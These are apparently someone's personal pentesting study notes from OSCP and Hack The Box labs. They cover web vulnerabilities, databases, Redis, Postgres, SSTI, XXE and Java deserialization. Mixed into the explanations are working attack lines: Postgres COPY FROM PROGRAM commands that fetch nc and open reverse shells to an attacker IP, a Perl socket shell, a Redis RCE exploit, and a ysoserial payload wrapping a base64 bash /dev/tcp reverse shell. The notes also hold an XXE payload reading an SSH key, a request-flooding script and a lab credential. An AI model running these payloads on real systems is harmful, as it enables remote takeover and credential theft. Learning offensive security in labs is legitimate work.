**DOM XSS** - Occurs when user input is directly shown in the browser and is written to an HTML DOM object (e.g., vulnerable username or page title).
**U XSS** ??


## Cross Site Request Forgery (CSRF)
[Cross Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf)

The third type of front end vulnerability that is caused by unfiltered user input is Cross-Site Request Forgery (CSRF). CSRF attacks may utilize XSS vulnerabilities to perform certain queries, and API calls on a web application that the victim is currently authenticated to. This would allow the attacker to perform actions as the authenticated user. It may also utilize other vulnerabilities to perform the same functions, like utilizing HTTP parameters for attacks.

A common CSRF attack to gain higher privileged access to a web application is to craft a JavaScript payload that automatically changes the victim's password to the value set by the attacker. Once the victim views the payload on the vulnerable page (e.g., a malicious comment containing the JavaScript CSRF payload), the JavaScript code would execute automatically. It would use the victim's logged-in session to change their password. Once that is done, the attacker can log in to the victim's account and control it.

CSRF can also be leveraged to attack admins and gain access to their accounts. Admins usually have access to sensitive functions, which can sometimes be used to attack and gain control over the back-end server (depending on the functionality provided to admins within a given web application). Following this example, instead of using JavaScript code that would return the session cookie, we would load a remote .js (JavaScript) file, as follows:

HTML : `"><script src=//www.example.com/exploit.js></script>`

### Prevention
Though there should be measures on the back end to detect and filter user input, it is also always important to filter and sanitize user input on the front end before it reaches the back end, and especially if this code may be displayed directly on the client-side without communicating with the back end. Two main controls must be applied when accepting user input:

Type 	Description
**Sanitization** - Removing special characters and non-standard characters from user input before displaying it or storing it.
**Validation** - Ensuring that submitted user input matches the expected format (i.e., submitted email matched email format)

Furthermore, it is also important to sanitize displayed output and clear any special/non-standard characters. In case an attacker manages to bypass front end and back end sanitization and validation filters, it will still not cause any harm on the front end.

Once we sanitize and/or validate user input and displayed output, we should be able to prevent attacks like HTML Injection, XSS, or CSRF. Another solution would be to implement a web application firewall (WAF), which should help to prevent injection attempts automatically. However, it should be noted that WAF solutions can potentially be bypassed, so developers should follow coding best practices and not merely rely on an appliance to detect/block attacks.

As for CSRF, many modern browsers have built-in anti-CSRF measures, which prevent automatically executing JavaScript code. Furthermore, many modern web applications have anti-CSRF measures, including certain HTTP headers and flags that can prevent automated requests (i.e., anti-CSRF token, or http-only/X-XSS-Protection). Certain other measures can be taken from a functional level, like requiring the user to input their password before changing it. Many of these security measures can be bypassed, and therefore these types of vulnerabilities can still pose a major threat to the users of a web application. This is why these precautions should only be relied upon as a secondary measure, and developers should always ensure that their code is not vulnerable to any of these attacks.

This Cross-Site Request Forgery Prevention Cheat Sheet from OWASP discusses the attack and prevention measures in greater detail.

## Back end Stacks
There are many popular combinations of "stacks" for back-end servers, which contain a specific set of back end components. 
Some common examples include:
### Combinations|Components
- **LAMP** =	(`Linux, Apache, MySQL, and PHP.`\)
- **WAMP** =	(`Windows, Apache, MySQL, and PHP.`\)
- **WINS** =	(`Windows, IIS, .NET, SQL Server`\)
- **MAMP** =	(`macOS, Apache, MySQL, and PHP.`\)
- **XAMPP** =	(`Cross-Platform, Apache, MySQL, and PHP/PERL.`\)
We can find a comprehensive list of Web Solution Stacks in this [article](https://en.wikipedia.org/wiki/Solution_stack)

# Common Response codes
### Code |	Description
**Successful responses** 	
- `200 OK` :	The request has succeeded
**Redirection messages**
- `301 Moved Permanently` :	The URL of the requested resource has been changed permanently
- `302 Found` :	The URL of the requested resource has been changed temporarily
**Client error responses**
- `400 Bad Request` : The server could not understand the request due to invalid syntax
- `401 Unauthorized` :	Unauthenticated attempt to access page
- `403 Forbidden `:	The client does not have access rights to the content
- `404 Not Found` :	The server can not find the requested resource
- `405 Method Not Allowed`: The request method is known by the server but has been disabled and cannot be used
- `408 Request Timeout` : This response is sent on an idle connection by some servers, even without any previous request by the client
**Server error responses** 	
- `500 Internal Server Error`: 	The server has encountered a situation it doesn't know how to handle
- `502 Bad Gateway` :	The server, while working as a gateway to get a response needed to handle the request, received an invalid response
- `504 Gateway Timeout` :	The server is acting as a gateway and cannot get a response in time


### Web servers 
- [Apache](https://www.apache.org/) 'or httpd' is the most common web server on the internet, hosting more than 40% of all internet websites. Apache usually comes pre-installed in most Linux distributions and can also be installed on Windows and macOS servers.
- [NGINX](https://www.nginx.com/) is the second most common web server on the internet, hosting roughly 30% of all internet websites. NGINX focuses on serving many concurrent web requests with relatively low memory and CPU load by utilizing an async architecture to do so. This makes NGINX a very reliable web server for popular web applications and top businesses worldwide, which is why it is the most popular web server among high traffic websites, with around 60% of the top 100,000 websites using NGINX.
- [IIS (Internet Information Services)](https://en.wikipedia.org/wiki/Internet_Information_Services) is the third most common web server on the internet, hosting around 15% of all internet web sites. IIS is developed and maintained by Microsoft and mainly runs on Microsoft Windows Servers.
- [Apache Tomcat](https://tomcat.apache.org/) - see also
- [node](https://nodejs.org/en/) - see also

## Data Bases
### Relational (SQL) databases 
store their data in tables, rows, and columns. Each table can have unique keys, which can link tables together and create relationships between tables.
Some of the most common relational databases include:

Type 	Description
- **MySQL** : 	The most commonly used database around the internet. It is an open-source database and can be used completely free of charge
- **MSSQL** : 	Microsoft's implementation of a relational database. Widely used with Windows Servers and IIS web servers
- **Oracle** : 	A very reliable database for big businesses, and is frequently updated with innovative database solutions to make it faster and more reliable. It can be costly, even for big businesses
- **PostgreSQL** :  	Another free and open-source relational database. It is designed to be easily extensible, enabling adding advanced new features without needing a major change to the initial database design
- Other common SQL databases include: **SQLite, MariaDB, Amazon Aurora, and Azure SQL.**
### Non-relational (NoSQL)

A non-relational database does not use tables, rows, columns, primary keys, relationships, or schemas. Instead, a NoSQL database stores data using various storage models, depending on the type of data stored.

Due to the lack of a defined structure for the database, NoSQL databases are very scalable and flexible. When dealing with datasets that are not very well defined and structured, a NoSQL database would be the best choice for storing our data.

There are 4 common storage models for NoSQL databases:

- Key-Value
- Document-Based
- Wide-Column
- Graph

Each of the above models has a different way of storing data. For example, the Key-Value model usually stores data in JSON or XML, and has a key for each pair, storing all of its data as its value:

Some of the most common NoSQL databases include:
Type 	Description
**MongoDB** : 	The most common NoSQL database. It is free and open-source, uses the Document-Based model, and stores data in JSON objects
**ElasticSearch** : 	Another free and open-source NoSQL database. It is optimized for storing and analyzing huge datasets. As its name suggests, searching for data within this database is very fast and efficient
**Apache Cassandra** : 	Also free and open-source. It is very scalable and is optimized for gracefully handling faulty values

Other common NoSQL databases include: **Redis, Neo4j, CouchDB, and Amazon DynamoDB.**

## Redis
An open-source, in-memory data store used as a database, cache, and message broker for fast, real-time applications.

Conf might be in - 
```
redis.windows-service.conf                                                    # Redis - locations of conf file
/etc/redis/redis.conf                                                         # Redis - locations of conf file
/usr/local/etc/redis/redis.conf                                               # Redis - locations of conf file
/etc/redis.conf                                                               # Redis - locations of conf file
```

```
redis-cli -h 10.10.10.233                                                     # Redis - cli - Login
```

```
10.10.10.10:6379> auth <PASSWORD>                                             # Redis - Auth - login with password
10.10.10.10:6379> keys *                                                      # Redis - List some stored keymat which might be crackable

10.10.10.10:6379> get "pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0"      # Redis - get stored keymat (which might be crackable - HTB Atom) 
"{\"Id\":\"<___BLOB__>\",\"Name\":\"Administrator\",\"Initials\":\"\",\"Email\":\"\",\"EncryptedPassword\":\"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\",\....___BLOB__.......}"
```

### Redis  RCE 
Say we need/have a password for a redis server: `Ready4Redis?` so we might be able to get RCE. 

**Note:** This exploit will not need a listener straight away.
- Get this `exp.so` file to upload 
  - https://github.com/n0b0dyCN/redis-rogue-server/blob/master/exp.so

...And run it with this exploit
  - https://github.com/Ridter/redis-rce?source=post_page-----88a3e0e21f62---------------------------------------

```
python redis-rce.py -r 192.168.153.166 -p 6379 -L 192.168.45.232 -P 4444 -f exp.so -a 'Ready4Redis?'
```


## Postgres

?? -https://www.postgresqltutorial.com/postgresql-getting-started/load-postgresql-sample-database/ ?

psql terminal commands


```
psql -h <IP_ADDRESS> -p 5437 -U postgres                  # postgres  Login to db ( PW after command)
```


```sh
postgres-> \! clear      # clear the terminal

postgres=> CREATE DATABASE dvdrental;
CREATE DATABASE
postgres=>



postgres-> \l           # list the databases
                                                List of databases
     Name      |       Owner       | Encoding |  Collate   |   Ctype    |            Access privileges
---------------+-------------------+----------+------------+------------+-----------------------------------------
 cloudsqladmin | cloudsqladmin     | UTF8     | en_US.UTF8 | en_US.UTF8 |
 dvdrental     | postgres          | UTF8     | en_US.UTF8 | en_US.UTF8 |
 postgres      | cloudsqlsuperuser | UTF8     | en_US.UTF8 | en_US.UTF8 |
 template0     | cloudsqladmin     | UTF8     | en_US.UTF8 | en_US.UTF8 | =c/cloudsqladmin                       +
               |                   |          |            |            | cloudsqladmin=CTc/cloudsqladmin
 template1     | cloudsqlsuperuser | UTF8     | en_US.UTF8 | en_US.UTF8 | =c/cloudsqlsuperuser                   +
               |                   |          |            |            | cloudsqlsuperuser=CTc/cloudsqlsuperuser
(5 rows)

postgres-> \q           # quit

#restore your DB
:$ pg_restore -d "host=35.193.143.41 port=5432 sslmode=require user=postgres dbname=dvdrental sslcert=client-cert.pem sslkey=client-key.pem sslrootcert=server-ca.pem" <PATH_TP_DB_DATA.tar>

# Log back in to the DB


# Switch the current db to dvdrental
postgres=> \c dvdrental
psql (14.10 (Homebrew), server 15.4)
WARNING: psql major version 14, server major version 15.
         Some psql features might not work.
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "dvdrental" as user "postgres".

# display all tables in the dvdrental database
dvdrental=> \dt
             List of relations
 Schema |     Name      | Type  |  Owner
--------+---------------+-------+----------
 public | actor         | table | postgres
 public | address       | table | postgres
 public | category      | table | postgres
 public | city          | table | postgres
 public | country       | table | postgres
 public | customer      | table | postgres
 public | film          | table | postgres
 public | film_actor    | table | postgres
 public | film_category | table | postgres
 public | inventory     | table | postgres
 public | language      | table | postgres
 public | payment       | table | postgres
 public | rental        | table | postgres
 public | staff         | table | postgres
 public | store         | table | postgres
(15 rows)

# Check the size of the DB
dvdrental=> SELECT pg_size_pretty(pg_database_size('dvdrental'));
 pg_size_pretty
----------------
 14 MB
(1 row)

# to see he size of all DBS
dvdrental=> SELECT datname, pg_size_pretty(pg_database_size(datname)) AS size FROM pg_database ORDER BY pg_database_size(datname) DESC;
    datname    |  size
---------------+---------
 dvdrental     | 14 MB
 cloudsqladmin | 7797 kB
 template1     | 7621 kB
 postgres      | 7597 kB
 template0     | 7597 kB
(5 rows)
\
```

##### psql postgres reverese shell

Offsec way to get `nc` and then get a shell reverse shell from postgres 

```sh
postgres=# \c postgres;                                                                 # psql postgres reverese shell
postgres=# DROP TABLE IF EXISTS cmd_exec;                                               # psql postgres reverese shell
postgres=# CREATE TABLE cmd_exec(cmd_output text);                                      # psql postgres reverese shell
postgres=# COPY cmd_exec FROM PROGRAM 'wget http://192.168.179.30/nc';                  # psql postgres reverese shell
postgres=# DELETE FROM cmd_exec;                                                        # psql postgres reverese shell
postgres=# COPY cmd_exec FROM PROGRAM 'nc -n 192.168.179.30 5437 -e /usr/bin/bash';     # psql postgres reverese shell - Port 5437 is the listener port mirroring a psql port
```

```sh
PG=# SELECT version();                                    # psql postgres reverese shell (alt Offsec PG Splodge) - FIRST Check the version is above 9.3
PG=# DROP TABLE IF EXISTS cmd_exec;                       # psql postgres reverese shell (alt Offsec PG Splodge)
PG=# CREATE TABLE cmd_exec(cmd_output text);              # psql postgres reverese shell (alt Offsec PG Splodge)
PG=# COPY cmd_exec FROM PROGRAM 'id';                     # psql postgres reverese shell (alt Offsec PG Splodge)
PG=# COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.179.181:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';             # psql postgres reverese shell (alt Offsec PG Splodge)
SELECT * FROM cmd_exec;                                   # psql postgres reverese shell (alt Offsec PG Splodge)
```





```

# Openssl
To view the details of a certificate (e.g., client-cert.pem), use:
- `openssl x509 -in client-cert.pem -text -noout`
This command displays the certificate's subject, issuer, validity dates, and more in a readable format.

To verify a private key (e.g., client-key.pem), use:
- `openssl rsa -in client-key.pem -check`
This command checks the consistency of the private key.

To ensure a certificate and a private key match, you can compare their modulus values:
- `openssl x509 -noout -modulus -in client-cert.pem | openssl md5`
- `openssl rsa -noout -modulus -in client-key.pem | openssl md5`
If the output (MD5 hash) of both commands matches, it means the certificate and the key pair correctly.

To view the details of a CA certificate (e.g., server-ca.pem), you can use the same command as for viewing a certificate:
- `openssl x509 -in server-ca.pem -text -noout`

If you also have CSRs (Certificate Signing Request) to analyze, you can view their details using:
- `openssl req -text -noout -verify -in yourcsr.csr`

To verify a certificate against a specific CA certificate, use:
- `openssl verify -CAfile server-ca.pem client-cert.pem`
This command checks if the client-cert.pem is trusted by the server-ca.pem CA certificate.

Although your files are local, if you want to check the SSL/TLS setup of a server using these certificates or keys, you can use:
- `openssl s_client -connect hostname:port -CAfile server-ca.pem -cert client-cert.pem -key client-key.pem`
Replace` hostname:port` with the server's address and port you wish to test.

See the details inc common name of a website (htb ESCAPE)
- `openssl s_client -showcerts -connect <IP_ADDRESS>:PORT | openssl x509 -noout -text | less`
Createa pfx file
- `openssl pkcs12 - in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`


----

# Common Web Vulnerabilities
- **Broken Authentication** refers to vulnerabilities that allow attackers to bypass authentication functions.
- **Broken Access Control** refers to vulnerabilities that allow attackers to access pages and features they should not have access to.
- **Malicious File Upload** : If the web application has a file upload feature and does not properly validate the uploaded files, we may upload a malicious script (i.e., a PHP script), which will allow us to execute commands on the remote server.
- **Command Injection** - If not properly filtered and sanitized, attackers may be able to inject another command to be executed alongside the originally intended command , which allows them to directly execute commands on the back end server and gain control over it.


**Tip:** The first step is to identify the version of the web application. This can be found in many locations, like the source code of the web application. For open source web applications, we can check the repository of the web application and identify where the version number is shown (e.g,. in (version.php) page), and then check the same page on our target web application to confirm.

**TIP** = We would usually be interested in exploits with a CVE score of 8-10 or exploits that lead to Remote Code Execution. Other types of public exploits should also be considered if none of the above is available.

## Brutforceing/DDOS /Rate limiting 
```py
from locust import HttpUser, task, between
import json

# install with pip install locust
# locustfile.py class file 
# I think like this : locust -f locustfile.py --headless -u 500 -r 5 --host=https://9.30.42.139:8436/isvaop/oauth2/introspect --loglevel=error

class MyUser(HttpUser):
    wait_time = between(1, 2)  # Adjust this based on your test needs

    @task
    def send_request(self):
        url = "http://9.30.42.139:445/isvaop/oauth2/token"
        headers = {
            'dpop': 'your_invalid_dpop_token_here',  # Use an invalid DPoP token
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        payload = {
            'client_id': 'your_client_id',
            'client_secret': 'your_client_secret',
            'scope': 'your_scope',
            'grant_type': 'your_grant_type'
        }
        
        # Send POST request
        response = self.client.post(url, headers=headers, data=payload)

        # Log the response (optional)
        if response.status_code != 200:
            print(f"Failed validation attempt: {response.status_code}")

        # You can add more logic here to capture and analyze the response

```



# --------------- Helpful Hints ---------------

### Enumeration/Foothold - (Helpful hints)
1. Scan all TCP ports.                                               # Helpful hints
2. Enumerate service versions and look for vulnerabilities.          # Helpful hints
3. Check FTP for anonymous login and enumerate contents.             # Helpful hints
4. Brute-force directories and files for hidden endpoints.           # Helpful hints
5. Enumerate web application for usernames or credentials.           # Helpful hints
6. Look for Wordpress plugins or configurations.                     # Helpful hints
7. Identify and enumerate database instances like PostgreSQL.        # Helpful hints
8. Test both GET and POST requests on web forms.                     # Helpful hints

### Exploitation/Remote Code Execution - (Helpful hints)
1. Research vulnerabilities in identified service versions.          # Helpful hints
2. Use file upload vulnerabilities to obtain RCE.                    # Helpful hints
3. Look for command injection in parameters or endpoints.            # Helpful hints
4. Test file inclusion (LFI/RFI) vulnerabilities.                    # Helpful hints
5. Exploit misconfigured or guessable database credentials for RCE.  # Helpful hints
6. Leverage Metasploit exploits when applicable.                     # Helpful hints
7. Explore writable directories to upload and execute shells.        # Helpful hints

### Privilege Escalation - (Helpful hints)
1. Enumerate SUID binaries and look for exploitable ones.            # Helpful hints
2. Check sudo permissions for privilege escalation paths.            # Helpful hints
3. Examine installed operating system version for known exploits.    # Helpful hints
4. Look at installed KBs for privilege escalation vulnerabilities.   # Helpful hints
5. Check config files for passwords or credentials.                  # Helpful hints
6. Explore backup files or directories for sensitive data.           # Helpful hints
7. Port forward to localhost to access restricted services.          # Helpful hints
8. Crack passwords for encrypted files like PDFs.                    # Helpful hints

# NEEDS READING

[Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
[Cross Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf) `<<`
[Sensitive data exposure OWASP](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure) 
[Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
[HTML injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection)
[XSS](https://owasp.org/www-community/attacks/xss/)
https://www.thesslstore.com/blog/http-security-headers/
https://owasp.org/www-project-secure-headers/
https://en.wikipedia.org/wiki/Data_access_layer
https://en.wikipedia.org/wiki/Hypervisor
https://en.wikipedia.org/wiki/Solution_stack
[Web-Server](https://en.wikipedia.org/wiki/Web_server)
[CVSS])https://en.wikipedia.org/wiki/Common_Vulnerability_Scoring_System)
https://www.balbix.com/insights/cvss-v2-vs-cvss-v3/
[Vuln Lab](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwjOzdvRs8fxAhXMMMAKHQrdAyAQFjABegQIBBAD&url=https%3A%2F%2Fwww.vulnerability-lab.com%2Findex.php&usg=AOvVaw3Ewut8Fk39kxAzmb-Dti3u)
https://sec-consult.com/vulnerability-lab/  ??  Vuln lab
[HTTP Response Codes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status)
https://en.wikipedia.org/wiki/Relational_database
[SQL INjection](https://owasp.org/www-community/attacks/SQL_Injection)
[API](https://en.wikipedia.org/wiki/API)
[SOAP])(https://en.wikipedia.org/wiki/SOAP)
[REST](https://en.wikipedia.org/wiki/Representational_state_transfer)
"anti-CSRF measures, including certain HTTP headers and flags that can prevent automated requests (i.e., anti-CSRF token, or http-only/X-XSS-Protection)."

[Basic Authentication](https://en.wikipedia.org/wiki/Basic_access_authentication)


## Have READ 
[OWASP Top 10](https://owasp.org/www-project-top-ten/)



# 3rd set of notes

## URL Encoding
When making a request to a web server, the data that we send can only contain certain characters from the
standard 128 character ASCII set. Reserved characters that do not belong to this set must be encoded. For
this reason we use an encoding procedure that is called URL Encoding . With this process for instance, the reserved character `&` becomes `%26` .

## SSTI
Template engines are designed to generate web pages by combining fixed templates with volatile data. 
Server-side template injection attacks can occur when user input is concatenated directly into a template, rather than passed in as data. 
This allows attackers to inject arbitrary template directives in order to manipulate the template engine, 
often enabling them to take complete control of the server.

Tool - https://github.com/epinna/tplmap

Node.js and Python web backend servers often make use of a software called "Template Engines".

### What is a Template Engine?

Template Engines are used to display dynamically generated content on a web page. They replace the
variables inside a template file with actual values and display these values to the client (i.e. a user opening a
page through their browser).
For instance, if a developer needs to create a user profile page, which will contain Usernames, Emails,
Birthdays and various other content, that is very hard if not impossible to achieve for multiple different
users with a static HTML page. The template engine would be used here, along a static "template" that
contains the basic structure of the profile page, which would then manually fill in the user information and
display it to the user.
Template Engines, like all software, are prone to vulnerabilities. The vulnerability that we will be focusing on
today is called Server Side Template Injection (SSTI).

## What is an SSTI?
Server-side template injection is a vulnerability where the attacker injects malicious input into a template in order
to execute commands on the server.
To put it plainly an SSTI is an exploitation technique where the attacker injects native (to the Template
Engine) code into a web page. The code is then run via the Template Engine and the attacker gains code
execution on the affected server.
This attack is very common on Node.js websites and there is a good possibility that a Template Engine is
being used to reflect the email that the user inputs in the contact field.

### Basic SSTI payloads
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```


TO Read 
- https://dev.mysql.com/doc/refman/8.0/en/connecting.html
- https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/cheatsheet/
- https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
- https://book.hacktricks.xyz/windows/ntlm/places-to-steal-ntlm-creds#lfi
- https://en.wikipedia.org/wiki/Virtual_hosting # Ignition.htb
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection # SSTI

- PAYLOAD ALL THE THINGS - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

  
Tools to understand
- https://github.com/SpiderLabs/Responder
- https://github.com/Hackplayers/evil-winr
- Rev Shell generator - https://www.revshells.com/
- Impaket : https://github.com/fortra/impacket
- Impacket MySQL - https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py
- https://www.sqlshack.com/use-xp-cmdshell-extended-procedure/

Jenkins hacking - https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/ssrf-vulnerable-platforms?q=jenkins#jenkins

### SSRF

Basic payload to test from Offsec Symbolic ( )
```
<iframe src="C:/Windows/system32/drivers/etc/hosts" height=1000 width=1000 />
```

## Port Knocking 

Lets say we have a `knockd.conf` like this (OSPG DC-9):
```
[options]
    UseSyslog
    
[openSSH]
	sequence    = 7469,8475,9842
	seq_timeout = 25
	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn

[closeSSH]
	sequence    = 9842,8475,7469
	seq_timeout = 25
	command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn
```

At the top is the config file `options` which will uses `syslog` instead of something like: `logfile = /var/log/knockd.log`
- `sequence` is the order and ports which need to be knocked
- `seq_timeout` is how long is allowed in seconds to complete the sequence
- `commnad` - Shell command executed when that sequence is successfully matched. `%IP%` is replaced at run time wih the knocking ip
- `tcpflags` the type of packets the knock will accepct

Toi knock the target we use:
```
knock 192.168.139.209 7469 8475 9842
```
`nmap` again should show the port is now open.





### HTB MArkup

XXE PL 
<?xml version = "1.0"?>INSERTPAYLOAD IN HERE<order><quantity>fdasd</quantity><item>Electronics</item><address>rewqrewq</address></order>

as per: <?xml version = "1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'?]><order><quantity>fdasd</quantity><item>Electronics</item><address>rewqrewq</address></order>

INteresting - https://gist.github.com/AvasDream/47f13a510e543009a50c8241276afc24
Read - https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity

## Java 
Both Burp and ZAP rely on Java Runtime Environment (JRE) to run, but this package should be included in the installer by default. If not, we can follow the instructions found on this [page](https://docs.oracle.com/goldengate/1212/gg-winux/GDRAD/java.htm#BGBFJHAB).

### ysoserial (insecure Decerialization java)
Get the latest jar of ysoserial here - https://github.com/frohoff/ysoserial/releases
Finaly went wit hthis 

```
java -jar ysoserial-all.jar CommonsCollections4 "bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMjAzLzc4NjAgMD4mMQ==}|{base64,-d}|{bash,-i}" > recycler.ser
```

where `/bin/bash -i >& /dev/tcp/192.168.179.203/7860 0>&1` is converted to B64 in cyberchef `L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMjAzLzc4NjAgMD4mMQ==
`

### (.NET ysoseriel)  Ysoserial.NET 
- https://github.com/pwntester/ysoserial.net

Creates a .NET payload (in the HTB JSON box this was base64 encoded) and placed in the Bearer Token.

```
PS C:\Users\Tester\Documents\ysoserial.net\ysoserial\bin\Release> .\ysoserial.exe -g ObjectDataProvider -f Json.Net -c "10.10.15.187"
```

## Proxies

**Cirts**
- _Once we have our certificates, we can install them within Firefox by browsing to `about:preferences#privacy`, scrolling to the bottom, and clicking View Certificates._

### Architype (HTB) 

`Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc`

- https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py  
- https://www.sqlshack.com/use-xp-cmdshell-extended-procedure/

Install and run Impacket 
1. `git clone https://github.com/SecureAuthCorp/impacket.git`
2. Navigate to the folder - `cd impacket`
3. `pip3 install -r requirements.txt`
4. `python3 setup.py install`


Note: **This is wrong** `python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.57.196 -windows-auth`. The forward slash should be a back slash as in `ARCHETYPE`.

To Read
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
- https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
- https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege
- https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato

Snipets---

smbclient -N -L \\\\{<IP_ADDRESS>}\\
-N : No password
-L : This option allows you to look at what services are available on a server


┌──(root㉿kali)-[~/Tools/impacket/examples]
└─# python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.58.104 -windows-auth 

python3 -m http.server 80
powershell
wget http://10.10.14.114/winPEASx64.exe -outfile winPEASx64.exe

auth



---Tools
NC 64 bit binary in the tool kit : https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------
WinPeas : https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe



GQ: What is `zip2john` exactly?  _"What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?"_



https://portswigger.net/web-security/xxe/blind
https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
https://github.com/payloadbox/xxe-injection-payload-list



# RESROUCES

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise

https://github.com/xnl-h4ck3r/GAP-Burp-Extension


OSCP ??? https://github.com/lutzenfried/Methodology/blob/main/01-%20Internal.md#silver-ticket







## ---------------------------------- END OF GENERAL+TOOLS+TECH ----------------------------------
```
&END-OF-GENERAL+TOOLS+TECH&END-OF-GENERAL+TOOLS+TECH&END-OF-GENERAL+TOOLS+TECH&END-OF-GENERAL+TOOLS+TECH&END-OF-GENERAL+TOOLS+TECH&END-OF-GENERAL+TOOLS+TECH&
&END-OF-GENERAL+TOOLS+TECH&END-OF-GENERAL+TOOLS+TECH&END-OF-GENERAL+TOOLS+TECH&END-OF-GENERAL+TOOLS+TECH&END-OF-GENERAL+TOOLS+TECH&END-OF-GENERAL+TOOLS+TECH
&END-OF-GENERAL+TOOLS+TECH&END-OF-GENERAL+TOOLS+TECH&END-OF-GENERAL+TOOLS+TECH&END-OF-GENERAL+TOOLS+TECH&END-OF-GENERAL+TOOLS+TECH&END-OF-GENERAL+TOOLS+TECH&
```
## ---------------------------------- END OF GENERAL+TOOLS+TECH ----------------------------------



--------


# Reporting with Sysreptor

I have made two alais in my zshrc to stop and start the [Sysreptor](https://docs.sysreptor.com/)

```
sysreptor_start
```

```
sysreptor_stop
```

The UI of the docker containers will then be visible at: http://127.0.0.1:8000

Installtion based on this guys blog post 
- https://olivierkonate.medium.com/how-to-easily-write-pentest-reports-with-sysreptor-42fb8593a653
- Repo: https://github.com/0liverFlow/install_sysreptor
